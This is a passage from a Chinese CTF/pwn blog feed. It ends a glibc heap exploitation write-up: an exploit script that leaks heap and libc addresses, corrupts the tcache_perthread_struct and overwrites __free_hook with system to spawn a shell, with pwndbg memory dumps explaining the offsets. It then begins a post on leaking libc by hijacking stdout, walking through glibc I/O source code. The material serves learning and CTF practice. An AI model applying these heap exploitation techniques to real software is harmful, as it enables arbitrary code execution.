&#x27;</span>)</span><br><span class="line">data = uu64(r(<span class="number">6</span>))</span><br><span class="line">lg(<span class="string">&#x27;data&#x27;</span>,data)</span><br><span class="line">heap = data - <span class="number">0x260</span></span><br><span class="line">lg(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line"><span class="comment">##leak libc_base</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#9-15</span></span><br><span class="line"><span class="comment">##此时tcachebins为空，当再次申请chunk会将fastbins的chunk放入tcachebins中</span></span><br><span class="line">add(<span class="number">0x68</span>,p64(heap+<span class="number">0x10</span>))<span class="comment">#16</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#17</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#18</span></span><br><span class="line"><span class="comment">##设置tcache_perthread_struct chunk的size对应的tcachebins为0xff，即让系统认为tcachebins中这个size处，已经满了</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x23</span>+<span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">add(<span class="number">0x68</span>,payload)<span class="comment">#19</span></span><br><span class="line">show(<span class="number">19</span>)</span><br><span class="line">delete(<span class="number">19</span>)</span><br><span class="line">show(<span class="number">19</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">data =  uu64(r(<span class="number">6</span>))</span><br><span class="line">lg(<span class="string">&#x27;main_arena+96&#x27;</span>,data)</span><br><span class="line">libc_base = data - <span class="number">96</span> - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"><span class="comment">##malloc出来tcache_perthread_struct chunk使用去修改tcache_entry指针实现任意malloc</span></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x40</span>+p64(libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">8</span>))<span class="comment">#20</span></span><br><span class="line"><span class="comment">##这段代码就是改tcachebins的0x20处的next指针指向__free_hook</span></span><br><span class="line"><span class="comment">##申请出上面这个0x20大小的chunk，改__free_hook为system</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))<span class="comment">#21</span></span><br><span class="line"><span class="comment">##b&#x27;/bin/sh\x00&#x27;覆盖了libc_base+libc.sym[&#x27;__free_hook&#x27;]-8，system覆盖了__free_hook</span></span><br><span class="line">delete(<span class="number">21</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<ol>
<li>tcache中的偏移，与存放chunk_size的大小</li>
</ol>
<p>疑问一：为什么这里<code>payload = b&#39;\x00&#39;*0x23+b&#39;\xff&#39;</code></p>
<p>在此处pwndbg中，tcache_prethread_struct的chunk内存，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/24gx 0x555555606000</span><br><span class="line">0x555555606000: 0x0000000000000000      0x0000000000000251</span><br><span class="line">0x555555606010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606030: 0x00000000ff000000      0x0000000000000000</span><br><span class="line">0x555555606040: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606070: 0x0000000000000000      0x0000010000000000</span><br><span class="line">0x555555606080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556060a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556060b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="comment">#前面这一块内存记录的是tcachebins中对应size的chunk的数量，在0xff前面有0x23个\x00,它们记录了从0x10 - 0x240size的chunk，0xff的位置记录的是0x250大小的chunk,由于0xff导致0x250[-1]，以至于系统认为此处的chunk已满</span></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x70 [  0]: 0x10000000000</span><br><span class="line">0x250 [ -1]: 0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//关于这个前0x40的内存，这里可以参考源码：</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];<span class="comment">//64 = 0x40</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];<span class="comment">//后面的就是tcache_entry,即每个tcachebins中记录的chunk_memptr</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>



<p>疑问二：<code>b&#39;\x00&#39;*0x40+p64(libc_base+libc.sym[&#39;__free_hook&#39;]-8)</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/24gx 0x555555606000</span><br><span class="line">0x555555606000: 0x0000000000000000      0x0000000000000101</span><br><span class="line">0x555555606010: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606020: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606040: 0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="comment">#前面这些应该是记录tcachebins中每个size对应chunk的数量</span></span><br><span class="line"><span class="comment">#从这里开始往下应该是记录了每个size的chunk_memptr,最小的是0x20</span></span><br><span class="line">0x555555606050: 0x00007ffff7fc65a0      0x0000000000000000</span><br><span class="line">0x555555606060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606070: 0x0000000000000000      0x0000010000000000</span><br><span class="line">0x555555606080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555606090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556060a0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<h2 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h2><p>ctf-wiki，<a href="https://nightrainy.github.io/">知世</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>hijack_stdout</title>
    <url>/2025/03/27/hijack_stdout/</url>
    <content><![CDATA[<p>在glibc_heap的利用中，很可能会遇到没有show功能的程序，从而泄露不了地址，我们可以通过控制stdio，在通过puts等io操作输出之内的函数泄露libc地址</p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="IO-puts"><a href="#IO-puts" class="headerlink" title="_IO_puts()"></a>_IO_puts()</h3><p>首先我们看puts()函数的源代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  _IO_size_t len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们要关注的是<code>_IO_sputn</code>，因为只有它调用了<code>str</code>参数，跳转到定义</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br></pre></td></tr></table></figure>

<p>AI的解释：</p>
<p>在glibc中，<code>#define _IO_sputn(__fp, __s, __n)</code>是一个宏定义，它的作用是将一个函数或操作的调用转换为另一个函数或操作的调用。在这个宏中，<code>_IO_XSPUTN</code>是实际执行操作的函数，<code>__fp</code>、<code>__s</code> 和 <code>__n</code> 是传递给该函数的参数。</p>
<p>具体来说，这个宏的定义可以被分解为以下几点：</p>
<ol>
<li><p><strong>宏定义</strong>：<code>#define</code>是C语言中的宏定义指令，用于定义一个宏。这个宏在预处理阶段会被展开。</p>
</li>
<li><p><strong>参数</strong>：<code>__fp</code>、<code>__s</code>和<code>__n</code>是这个宏接受的三个参数：</p>
<ul>
<li><code>__fp</code>：通常是一个指向文件流的指针（<code>FILE *</code>），表示要写入的目标文件流。</li>
<li><code>__s</code>：通常是一个指向字符数组的指针，表示要写入的数据。</li>
<li><code>__n</code>：表示要写入的字符数。</li>
</ul>
</li>
<li><p><strong>展开</strong>：当在代码中调用<code>_IO_sputn(fp, s, n)</code>时，预处理器会将其展开为<code>_IO_XSPUTN(fp, s, n)</code>，从而调用<code>_IO_XSPUTN</code>函数。</p>
</li>
</ol>
<p><code>_IO_XSPUTN</code>通常是一个更底层的实现，用于处理输出到文件流的具体细节。它可能会处理缓冲、字符编码等。</p>
<p>假设你在代码中有如下调用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_sputn(fp, buffer, size);</span><br></pre></td></tr></table></figure>

<p>在预处理阶段，这将被转换为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_XSPUTN(fp, buffer, size);</span><br></pre></td></tr></table></figure>

<p>这样，实际的输出操作将由<code>_IO_XSPUTN</code>函数执行，而<code>_IO_sputn</code>宏提供了一个更高级的接口。</p>
<p><strong>总结</strong></p>
<p><code>_IO_sputn</code>宏用于将对输出操作的高级抽象映射到底层实现，便于代码的维护和可读性，同时也可能涉及到优化和条件编译等特性。</p>
<p>这也就说明了这个<code>_IO_putn(__fp, __s, __n)</code>是一个虚表函数（网上好多是这样说的），虽然<code>#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN(__fp, __s, __n)</code>本身是一个宏定义，并不涉及C++的虚表机制，但可以通过理解多态性来认识它的作用和设计理念。在C++中，宏可以简化接口，同时背后可能调用一些更为复杂的底层实现，类似于如何通过虚表和虚函数来实现动态绑定。这种设计使得代码更加灵活和可维护。</p>
<hr>
<h3 id="IO-new-file-xsputn"><a href="#IO-new-file-xsputn" class="headerlink" title="_IO_new_file_xsputn()"></a>_IO_new_file_xsputn()</h3><p>这个<code>_IO_sputn()</code>最终调用的是<code>_IO_new_file_xsputn(</code>)函数，在glibc&#x2F;libio&#x2F;fileops.c&#x2F;1200行左右，这里我们要关注的是<code>_IO_OVERFLOW()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;</span><br><span class="line">  _IO_size_t to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  _IO_size_t count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">	  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		  count = p - s + <span class="number">1</span>;</span><br><span class="line">		  must_flush = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">	count = to_do;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">//用它来刷新缓冲区，刷新缓冲区也就会输出</span></span><br></pre></td></tr></table></figure>

<p>这个<code>_IO_OVERFLOW</code>也是虚表函数，它实际调用的是<code>_IO_new_file_overflow</code></p>
<h3 id="IO-new-file-overflow"><a href="#IO-new-file-overflow" class="headerlink" title="_IO_new_file_overflow"></a>_IO_new_file_overflow</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//flags不能包含_IO_NO_WRITES标志位0x8，否则就会执行这里的报错</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="comment">//这里若满足这两个条件之一就会执行下面这一大串代码，很有可能会报错</span></span><br><span class="line">  <span class="comment">//所以我们设置flags中_IO_CURRENTLY_PUTTING标志位为1，就可以跳过这一大段代码</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)<span class="comment">//</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//在这里我们要关注这个 _IO_do_write,调整到_Io_new_do_write</span></span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">    <span class="comment">//这里_IO_do_write输出了f-&gt;_IO_write_ptr - f-&gt;_IO_write_base中间的值</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure>

<h3 id="IO-new-do-write"><a href="#IO-new-do-write" class="headerlink" title="_IO_new_do_write()"></a>_IO_new_do_write()</h3><p>跳转到<code>_IO_new_do_write</code>，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;<span class="comment">//这里也就是io_do_erite调用了new_do_write进行写出</span></span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br><span class="line"><span class="comment">//new_do_write</span></span><br><span class="line"><span class="type">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">    <span class="comment">//首先检查了flags中_IO_IS_APPENDING标志位，0x1000处</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);<span class="comment">//这里就能实现输出f-&gt;_IO_write_ptr - f-&gt;_IO_write_base</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p>随便运行一个程序，用gdb调试：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/32gx &amp;_IO_2_1_stdout_</span><br><span class="line">0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad2887      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;:    0x00007ffff7dd26a3      0x00007ffff7dd26a3</span><br><span class="line">0x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;:    0x00007ffff7dd26a4      0x0000000000000000</span><br><span class="line">0x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;:    0x0000000000000000      0x00007ffff7dd18e0</span><br><span class="line">0x7ffff7dd2690 &lt;_IO_2_1_stdout_+112&gt;:   0x0000000000000001      0xffffffffffffffff</span><br><span class="line">0x7ffff7dd26a0 &lt;_IO_2_1_stdout_+128&gt;:   0x000000000a000000      0x00007ffff7dd3780</span><br><span class="line">0x7ffff7dd26b0 &lt;_IO_2_1_stdout_+144&gt;:   0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26c0 &lt;_IO_2_1_stdout_+160&gt;:   0x00007ffff7dd17a0      0x0000000000000000</span><br><span class="line">0x7ffff7dd26d0 &lt;_IO_2_1_stdout_+176&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd26e0 &lt;_IO_2_1_stdout_+192&gt;:   0x00000000ffffffff      0x0000000000000000</span><br><span class="line">0x7ffff7dd26f0 &lt;_IO_2_1_stdout_+208&gt;:   0x0000000000000000      0x00007ffff7dd06e0</span><br><span class="line">0x7ffff7dd2700 &lt;stderr&gt;:        0x00007ffff7dd2540      0x00007ffff7dd2620</span><br><span class="line">0x7ffff7dd2710 &lt;stdin&gt;: 0x00007ffff7dd18e0      0x00007ffff7a2db80</span><br><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus *)0x7ffff7dd2620</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537977,</span><br><span class="line">    _IO_read_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    <span class="comment">#正常情况下_IO_write_base和_IO_write_ptr是相等的</span></span><br><span class="line">    _IO_write_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;,</span><br><span class="line">    _fileno = 1,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = -1,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _lock = 0x7ffff7dd3780 &lt;_IO_stdfile_1_lock&gt;,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x7ffff7dd17a0 &lt;_IO_wide_data_1&gt;,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="built_in">times</span>&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看一下_IO_write_base &#x3D; 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt;</p>
